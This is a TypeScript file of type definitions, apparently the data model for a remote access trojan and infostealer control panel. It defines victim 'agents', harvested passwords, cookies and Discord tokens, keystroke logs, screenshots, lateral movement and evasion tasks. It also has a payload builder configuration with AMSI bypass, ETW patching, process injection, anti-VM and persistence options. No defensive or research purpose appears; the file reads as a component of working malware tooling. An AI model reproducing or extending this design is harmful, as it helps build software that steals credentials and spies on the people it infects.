export interface Agent {
  ID: string
  id?: string
  Hostname: string
  hostname?: string
  Username: string
  username?: string
  OS: string
  os?: string
  OSVersion?: string
  os_version?: string
  Arch: string
  arch?: string
  IP: string
  ip?: string
  ip_address?: string
  FirstSeen: string
  first_seen?: string
  LastSeen: string
  last_seen?: string
  Status: 'active' | 'idle' | 'offline'
  status?: 'active' | 'idle' | 'offline'
  Version: string
  PID: number
  pid?: number
  IsAdmin: boolean
  AV: string
  Country: string
  country?: string
  City: string
}

export interface Task {
  ID: string
  AgentID: string
  Type: string
  Command: string
  Status: 'pending' | 'running' | 'completed' | 'failed'
  Output: string
  CreatedAt: string
  CompletedAt: string | null
}

export interface FileTransfer {
  ID: string
  AgentID: string
  Path: string
  Size: number
  Type: 'download' | 'upload'
  Status: 'pending' | 'in_progress' | 'completed' | 'failed'
  Progress: number
  CreatedAt: string
  CompletedAt: string | null
}

export interface Credential {
  ID: string
  AgentID: string
  Source: string
  Username: string
  Password: string
  URL: string
  Browser: string
  CreatedAt: string
}

export interface Cookie {
  ID: string
  AgentID: string
  Domain: string
  Name: string
  Value: string
  Path: string
  Expires: string
  HttpOnly: boolean
  Secure: boolean
  CreatedAt: string
}

export interface DiscordToken {
  ID: string
  AgentID: string
  Token: string
  ClientID: string
  Email: string
  Username: string
  Avatar: string
  Nitro: boolean
  CreatedAt: string
}

export interface Keystroke {
  ID: string
  AgentID: string
  Window: string
  Keys: string
  Timestamp: string
}

export interface Screenshot {
  ID: string
  AgentID: string
  Data: string
  Width: number
  Height: number
  Timestamp: string
}

export interface ProcessInfo {
  PID: number
  Name: string
  PPID: number
  User: string
  CPU: number
  Memory: number
  Path: string
  Args: string
  Status: string
}

export interface LateralMove {
  ID: string
  AgentID: string
  Target: string
  Technique: string
  Status: 'pending' | 'running' | 'success' | 'failed'
  Output: string
  CreatedAt: string
}

export interface EvasionAction {
  ID: string
  AgentID: string
  Technique: string
  Target: string
  Status: 'pending' | 'running' | 'success' | 'failed'
  Output: string
  CreatedAt: string
}

export interface Module {
  ID: string
  Name: string
  Description: string
  Version: string
  Author: string
  Enabled: boolean
  Capabilities: string[]
}

export interface PayloadConfig {
  ServerHost: string
  ServerPort: number
  UseTLS: boolean
  Platform: 'windows' | 'linux'
  Arch: 'x64' | 'x86' | 'arm64'
  Obfuscation: boolean
  AntiDebug: boolean
  AntiVM: boolean
  SleepObfuscation: boolean
  EncryptedComms: boolean
  ProcessInjection: boolean
  InjectionMethod: string
  EncryptionKey: string
  CustomConfig: string
  Persistence: boolean
  HideConsole: boolean
  SleepInterval: number
  Jitter: number
  AmsiBypass: boolean
  EtwPatch: boolean
  PpidSpoof: boolean
  DllUnhook: boolean
  HeapEncrypt: boolean
  StackSpoof: boolean
}

export interface BuildResult {
  Success: boolean
  BinaryPath: string
  BinaryName: string
  Size: number
  Checksum: string
  Error: string
  DownloadB64?: string
}
export interface Notification {
  id: string
  type: 'info' | 'success' | 'warning' | 'error'
  title?: string
  message: string
  read: boolean
  timestamp: string
}

export interface ShellSession {
  id: string
  agentId: string
  command?: string
  status?: 'active' | 'closed'
  createdAt?: string
}
